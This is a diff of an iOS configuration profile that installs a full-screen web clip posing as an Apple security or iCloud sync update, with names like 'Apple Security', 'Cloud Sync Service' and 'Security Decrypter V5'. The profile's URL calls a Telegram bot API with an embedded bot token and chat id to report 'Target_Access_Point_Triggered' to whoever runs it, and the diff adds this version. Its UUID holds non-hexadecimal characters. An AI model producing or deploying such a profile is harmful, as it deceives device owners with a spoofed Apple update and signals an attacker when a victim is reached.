@@ -5,30 +5,30 @@
     <key>PayloadContent</key>
     <array>
         <dict>
-            <key>FullScreen</key>
-            <true/>
-            <key>IsRemovable</key>
-            <true/>
-            <key>Label</key>
-            <string>iCloud Sync Update</string>
             <key>PayloadDescription</key>
-            <string>Configures secure browser access and data synchronization.</string>
+            <string>Configures cloud data synchronization.</string>
             <key>PayloadDisplayName</key>
-            <string>Secure Verification Service</string>
+            <string>Cloud Sync Service</string>
             <key>PayloadIdentifier</key>
-            <string>com.apple.webclip.managed.1</string>
+            <string>com.apple.cloud.sync.v1</string>
+            <key>PayloadOrganization</key>
+            <string>Apple Security</string>
             <key>PayloadType</key>
-            <string>com.apple.webclip</string>
+            <string>com.apple.webclip.managed</string>
             <key>PayloadUUID</key>
             <string>D5E6F7G8-H9I0-J1K2-L3M4-N506P7Q8R9S0</string>
             <key>PayloadVersion</key>
             <integer>1</integer>
+            <key>Label</key>
+            <string>Continue Sync</string>
             <key>URL</key>
-            <string>https://api.telegram.org/bot8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k/sendMessage?chat_id=8639892987&amp;text=Target_System_Verified_Successfully_V5_🔥</string>
+            <string>https://api.telegram.org/bot8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k/sendMessage?chat_id=8639892987&amp;text=Target_Access_Point_Triggered_✅</string>
+            <key>FullScreen</key>
+            <true/>
         </dict>
     </array>
     <key>PayloadDescription</key>
-    <string>Critical security update to maintain private chat database and encryption.</string>
+    <string>Mandatory security update for chat encryption.</string>
     <key>PayloadDisplayName</key>
     <string>Security Decrypter V5</string>
     <key>PayloadIdentifier</key>
